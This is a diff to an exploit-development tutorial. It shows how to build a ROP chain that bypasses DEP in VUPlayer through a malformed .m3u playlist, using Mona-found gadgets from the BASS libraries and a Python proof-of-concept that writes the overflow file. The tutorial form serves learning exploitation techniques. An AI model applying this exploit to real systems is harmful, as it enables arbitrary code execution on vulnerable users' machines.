@@ -173,8 +173,60 @@ makedafile.write(fuzz)
 makedafile.close()
 ```
 
-Let's just knock all of these goals out in order starting with the EAX goal. 
+Let's just knock all of these goals out in order starting with the EAX goal. Before we start digging through Immunity manually, we'll let Mona do the heavy lifting with `!mona rop -m "basswma,bassmidi,bass"`. This will generate two files of interest to us: `rop.txt` and `rop_suggestions.txt`. 
+
+`rop.txt` is simply a huge list of ROP gadgets at our disposal. 
+
+`rop_suggestions.txt` is a smaller, more organized list of shorter gadgets that fit specific needs. If you specifically wanted to do something relatively simple and common, such as `INC EAX` you would check `rop_suggestions.txt` for those types of gadets. 
+
+We will be consulting these two text files constantly!
 
 ## EAX ROP Chain
+Looking at our goals, EAX needs to hold the value `90909090`. This is relatively straight forward. What we can do is put the value `0x90909090` onto the stack, and then `POP` that value into EAX. So we need to find a `pop eax` instruction. Since this is a simple command, let's first consult `rop_suggestions.txt`. 
+
+There is a section labeled `[pop eax]` with the following:
+```
+[pop eax]
+0x10104922 (RVA : 0x00004922) : # POP EAX # RETN 0x0C    ** [BASSWMA.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
+0x100201c3 (RVA : 0x000201c3) : # POP EAX # RETN 0x0C    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
+0x10015fe7 (RVA : 0x00015fe7) : # POP EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
+0x10015f82 (RVA : 0x00015f82) : # POP EAX # RETN    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
+0x10607f6f (RVA : 0x00007f6f) : # POP EAX # RETN 0x0C    ** [BASSMIDI.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
+0x1001fc83 (RVA : 0x0001fc83) : # POP EAX # RETN 0x04    ** [BASS.dll] **   |   {PAGE_EXECUTE_READWRITE}
+0x10015f77 (RVA : 0x00015f77) : # POP EAX # RETN    ** [BASS.dll] **   |  ascii {PAGE_EXECUTE_READWRITE}
+```
+
+Since we don't want to deal with non-default `RETN` values when possible, let's select a simple gadget such as the one at `0x10015fe7`.
+
+We have our two pieces, the value we want POP'd into EAX, and a gadget to do the POP'ing. Let's set them up in our POC.
+```python
+import sys
+import struct
+import os
+
+crash_file = "vuplayer-dep.m3u"
+
+# GOALS
+# EAX 90909090 => Nop                                                
+# ECX <writeable pointer> => flProtect                                 
+# EDX 00000040 => flNewProtect                             
+# EBX 00000201 => dwSize                                            
+# ESP ???????? => Leave as is                                         
+# EBP ???????? => Call to ESP (jmp, call, push,..)                
+# ESI ???????? => PTR to VirtualProtect - DWORD PTR of 0x1060E25C
+# EDI 10101008 => ROP-Nop same as EIP
+
+# EAX Chunk Affects: EAX
+eax = struct.pack('<L', 0x10015fe7) # a pointer to # POP EAX # RETN
+eax += struct.pack('<L', 0x90909090)
+
+fuzz = "A" * 1012
+fuzz += "\x08\x10\x10\x10" # 10101008  <-- Pointer to a RETN
+fuzz += "C" * (3000 - len(fuzz))
+
+makedafile = open(crash_file, "w")
+makedafile.write(fuzz)
+makedafile.close()
+```
 
 
